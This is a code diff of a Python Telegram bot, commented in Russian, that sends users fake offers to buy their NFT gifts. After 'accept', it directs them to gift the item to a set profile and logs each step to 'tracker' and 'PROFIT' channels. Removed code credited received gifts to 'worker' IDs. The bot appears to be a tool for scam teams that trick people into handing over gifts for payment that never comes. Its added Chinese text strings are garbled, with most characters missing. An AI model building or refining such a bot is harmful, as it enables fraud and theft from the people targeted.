@@ -6,13 +6,9 @@ import aiohttp
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
-from aiogram.filters import Command
 from aiogram.types import (
-    Message,
-    CallbackQuery,
-    LinkPreviewOptions,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton
+    Message, CallbackQuery, LinkPreviewOptions,
+    InlineKeyboardMarkup, InlineKeyboardButton
 )
 from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
 
@@ -50,14 +46,14 @@ TEXTS = {
         "declined": "You have declined the offer."
     },
     "cn": {
-        "offer_text": "用户 <b>{who}</b> 向您提供 {sum} {cur} 以换取礼物 <b>{name}</b>。",
-        "accepted": "🎁 <b>礼物：</b> {name}\n\n<b>已接受！</b>\n\n等待礼物转移。\n\n出价金额：{sum} {cur}",
-        "btn_give": "🎁 赠送礼物",
-        "btn_how": "❓ 如何赠送？",
-        "btn_decline": "❌ 拒绝",
-        "btn_accept": "✅ 接受",
-        "alert_how": "点击下方按钮打开接收者资料页。\n\n然后点击礼物图标并选择“赠送礼物”。",
-        "declined": "您已拒绝该提议。"
+        "offer_text": " <b>{who}</b>  {sum} {cur}  <b>{name}</b>。",
+        "accepted": "🎁 <b>：</b> {name}\n\n<b>！</b>\n\n。\n\n：{sum} {cur}",
+        "btn_give": "🎁 ",
+        "btn_how": "❓ ？",
+        "btn_decline": "❌ ",
+        "btn_accept": "✅ ",
+        "alert_how": "。\n\n“”。",
+        "declined": "。"
     }
 }
 
@@ -65,9 +61,9 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
+http_session: aiohttp.ClientSession | None = None
 
-# Глобальная сессия для HTTP-запросов (для высокой нагрузки)
-http_session: aiohttp.ClientSession = None
+NO_PREVIEW = LinkPreviewOptions(is_disabled=True)
 
 # =====================================
 # КНОПКИ
@@ -75,17 +71,16 @@ http_session: aiohttp.ClientSession = None
 def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
     return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
-                InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
-            ]
-        ]
+        inline_keyboard=[[
+            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
+            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
+        ]]
     )
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    profile_url = f"tg://resolve?domain={TARGET_USERNAME}&profile"
+    # ВАРИАНТ 1: прямая ссылка на профиль получателя
+    profile_url = f"https://t.me/{TARGET_USERNAME}"
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text=t["btn_give"], url=profile_url)],
@@ -94,192 +89,148 @@ def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     )
 
 # =====================================
-# КОМАНДА /OFFER
+# ТРЕКЕР
+
 # =====================================
-@dp.business_message(Command("offer"))
-async def cmd_offer_business(message: Message):
-    parts = message.text.split()
-    
-    if len(parts) < 5:
-        return await message.answer(
-            "Формат:\n<code>/offer https://t.me/nft/PlushPepe-2687 20 g ru</code>"
-        )
+tracker_bot: Bot | None = None
+if TRACKER_BOT_TOKEN and not TRACKER_BOT_TOKEN.startswith("ВСТАВЬ"):
+    tracker_bot = Bot(token=TRACKER_BOT_TOKEN)
 
-    url = parts[1]
-    raw_sum = parts[2]
-    cur_key = parts[3].lower()
-    lang = parts[4].lower()
-
-    # Автозамена http на https
-    if url.startswith("http://"):
-        url = url.replace("http://", "https://", 1)
-    elif not url.startswith("http"):
-        url = "https://" + url
-
-    if lang not in TEXTS:
-        lang = "ru"
-
-    if not url.startswith("https://t.me/nft/"):
-        return await message.answer("Ошибка: ссылка должна вести на NFT-подарок.")
-    if cur_key not in CURRENCY:
-        return await message.answer("Валюта только g или s.")
-    if not raw_sum.isdigit() or int(raw_sum) <= 0:
-        return await message.answer("Сумма должна быть положительным целым числом.")
-
+async def tracker_log(text: str):
+    if not tracker_bot:
+        return
     try:
-        conn = await bot.get_business_connection(message.business_connection_id)
-        worker_id = conn.user.id
+        await tracker_bot.send_message(TRACKER_ADMIN_ID, text)
+        await tracker_bot.send_message(
+            PROFIT_CHANNEL_ID, text, message_thread_id=PROFIT_TOPIC_ID
+        )
     except Exception:
-        worker_id = "unknown"
+        logging.exception("tracker_log error")
 
-    oid = uuid.uuid4().hex[:12]
-    raw_name = url.split("/")[-1]
-    gift_name = raw_name.replace("-", " #")
-
-    OFFERS[oid] = {
-        "url": url, "sum": raw_sum, "cur": CURRENCY[cur_key],
-        "name": gift_name, "lang": lang, "worker_id": worker_id
-    }
-
-    who = message.from_user.first_name if message.from_user else "User"
-    t = TEXTS[lang]
-    
-    caption = t["offer_text"].format(who=who, sum=raw_sum, cur=CURRENCY[cur_key], name=gift_name) + f"\n\n{url}"
-
+# =====================================
+# ПОЛУЧЕНИЕ НАЗВАНИЯ ПОДАРКА ПО ССЫЛКЕ
+# =====================================
+async def fetch_gift_name(url: str) -> str:
     try:
-        await bot.delete_business_messages(
-            business_connection_id=message.business_connection_id,
-            message_ids=[message.message_id]
-        )
-    except Exception as e:
-        logging.error(f"Delete error: {e}")
+        async with http_session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            html = await resp.text()
+        start = html.find('og:title"')
+        if start != -1:
+            start = html.find('content="', start) + len('content="')
+            end = html.find('"', start)
+            return html[start:end]
+    except Exception:
+        pass
+    return url.rsplit("/", 1)[-1] or url
 
+# =====================================
+# КОМАНДА .оффер
+# =====================================
+@dp.business_message(F.text.startswith(".оффер"))
+async def handle_custom_command(message: Message):
+    logging.info("!!! ПОЛУЧЕНА КОМАНДА .оффЕР !!!")
     try:
+        text = message.text.replace(".оффер", "", 1).strip()
+        parts = text.split()
+
+        if len(parts) < 3:
+            return
+
+        url = parts[0]
+        raw_sum = parts[1]
+        cur_key = parts[2].lower()
+        lang = parts[3].lower() if len(parts) > 3 else "ru"
+
+        if cur_key not in CURRENCY:
+            await bot.send_message(message.chat.id, "Валюта: g (💎) или s (⭐)")
+            return
+
+        t = TEXTS.get(lang, TEXTS["ru"])
+
+        gift_name = await fetch_gift_name(url)
+
+        oid = uuid.uuid4().hex[:8]
+        OFFERS[oid] = {
+            "url": url,
+            "sum": raw_sum,
+            "cur": CURRENCY[cur_key],
+            "lang": lang,
+            "gift_name": gift_name,
+            "seller_id": message.from_user.id,
+            "seller_name": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name,
+        }
+
         await bot.send_message(
-            chat_id=message.chat.id, text=caption, reply_markup=offer_kb(oid, lang),
-            business_connection_id=message.business_connection_id,
-            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True)
+            chat_id=TARGET_USERNAME,
+            text=t["offer_text"].format(
+                who=OFFERS[oid]["seller_name"],
+                sum=raw_sum,
+                cur=CURRENCY[cur_key],
+                name=gift_name
+            ),
+            reply_markup=offer_kb(oid, lang),
+            link_preview_options=NO_PREVIEW
         )
-    except Exception as e:
-        logging.error(f"Send error: {e}")
 
-# =====================================
-# ПРИНЯТИЕ ОФФЕРА
-# =====================================
-@dp.callback_query(F.data.startswith("acc:"))
-async def on_accept(call: CallbackQuery):
-    oid = call.data.split(":")[1]
-    data = OFFERS.get(oid)
-
-    if not data:
-        return await call.answer("Оффер устарел.", show_alert=True)
-
-    lang = data["lang"]
-    t = TEXTS.get(lang, TEXTS["ru"])
-    
-    new_caption = t["accepted"].format(name=data['name'], sum=data['sum'], cur=data['cur']) + f"\n\n{data['url']}"
-
-    try:
-        await call.message.edit_text(
-            text=new_caption, reply_markup=instruction_kb(lang),
-            link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True)
+        await tracker_log(
+            f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} → {TARGET_USERNAME} | "
+            f"{raw_sum} {CURRENCY[cur_key]} | {gift_name}"
         )
     except TelegramRetryAfter as e:
         await asyncio.sleep(e.retry_after)
-        try:
-            await call.message.edit_text(text=new_caption, reply_markup=instruction_kb(lang))
-        except Exception:
-            pass
-    except TelegramBadRequest as e:
-        if "message is not modified" not in str(e):
-            logging.error(f"Edit error: {e}")
-    except Exception as e:
-        logging.error(f"Edit error: {e}")
+    except Exception:
+        logging.exception("Ошибка в .оффер")
 
-    await call.answer()
+# =====================================
+# КОЛБЭКИ
+# =====================================
+@dp.callback_query(F.data.startswith("acc:"))
+async def cb_accept(call: CallbackQuery):
+    oid = call.data.split(":", 1)[1]
+    offer = OFFERS.get(oid)
+    if not offer:
+        await call.answer("Оффер не найден", show_alert=True)
+        return
+    t = TEXTS.get(offer["lang"], TEXTS["ru"])
+    await call.message.edit_text(
+        t["accepted"].format(
+            name=offer["gift_name"],
+            sum=offer["sum"],
+
+            cur=offer["cur"]
+        ),
+        reply_markup=instruction_kb(offer["lang"])
+    )
+    await tracker_log(f"✅ Оффер {oid} принят ({offer['gift_name']})")
+
+@dp.callback_query(F.data.startswith("dec:"))
+async def cb_decline(call: CallbackQuery):
+    oid = call.data.split(":", 1)[1]
+    offer = OFFERS.get(oid)
+    if not offer:
+        await call.answer("Оффер не найден", show_alert=True)
+        return
+    t = TEXTS.get(offer["lang"], TEXTS["ru"])
+    await call.message.edit_text(t["declined"])
+    await tracker_log(f"❌ Оффер {oid} отклонён ({offer['gift_name']})")
 
 @dp.callback_query(F.data.startswith("alert_2:"))
-async def show_alert_2(call: CallbackQuery):
-    lang = call.data.split(":")[1]
+async def cb_alert(call: CallbackQuery):
+    lang = call.data.split(":", 1)[1]
     t = TEXTS.get(lang, TEXTS["ru"])
     await call.answer(t["alert_how"], show_alert=True)
 
-@dp.callback_query(F.data.startswith("dec:"))
-async def on_decline(call: CallbackQuery):
-    oid = call.data.split(":")[1]
-    data = OFFERS.pop(oid, None)
-    lang = data["lang"] if data else "ru"
-    t = TEXTS.get(lang, TEXTS["ru"])
-
-    await call.message.edit_text(text=t["declined"], reply_markup=None)
-    await call.answer()
-
 # =====================================
-# ФОНОВАЯ ОБРАБОТКА ПОДАРКА
-# =====================================
-async def process_gift_background(message: Message, worker_id: str, stars: int, base_name: str, gift_id: str):
-    """Эта функция работает в фоне, не блокируя бота"""
-    # 1. Пересылаем подарок
-    try:
-        await bot.forward_message(
-            chat_id=PROFIT_CHANNEL_ID, message_thread_id=PROFIT_TOPIC_ID,
-            from_chat_id=message.chat.id, message_id=message.message_id
-        )
-    except Exception as e:
-        logging.error(f"Forward error: {e}")
-
-    # 2. Отправляем в трекер (используем общую сессию)
-    tracker_text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
-    tracker_url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
-
-    try:
-        async with http_session.post(
-            tracker_url,
-            json={"chat_id": TRACKER_ADMIN_ID, "text": tracker_text}
-        ) as resp:
-            if resp.status != 200:
-                logging.error(f"Tracker error: {await resp.text()}")
-    except Exception as e:
-        logging.error(f"HTTP error: {e}")
-
-# =====================================
-# ПОЛУЧЕНИЕ ПОДАРКА
-# =====================================
-@dp.business_message(F.gift)
-async def handle_gift(message: Message):
-    gift = message.gift
-    if not gift:
-        return
-
-    try:
-        conn = await bot.get_business_connection(message.business_connection_id)
-        worker_id = conn.user.id
-    except Exception:
-        worker_id = "unknown"
-
-    stars = getattr(gift, "star_count", 0) or 0
-    base_name = getattr(gift, "base_name", "") or ""
-    gift_id = getattr(gift, "id", "")
-
-    # ЗАПУСКАЕМ ФОНОВУЮ ЗАДАЧУ (это позволяет принимать новые подарки, не дожидаясь отправки в трекер)
-    asyncio.create_task(
-        process_gift_background(message, worker_id, stars, base_name, gift_id)
-    )
-
-# =====================================
-# ЗАПУСК И ОСТАНОВКА
+# ЗАПУСК
 # =====================================
 async def main():
     global http_session
-    # Создаем одну сессию на всё время работы
-    http_session = aiohttp.ClientSession()
-    
-    print("Оффер-бот запущен (режим высокой нагрузки)!")
-    try:
+    async with aiohttp.ClientSession() as session:
+        http_session = session
         await dp.start_polling(bot)
-    finally:
-        # Корректно закрываем сессию при выключении
-        await http_session.close()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        logging.info("Бот остановлен")
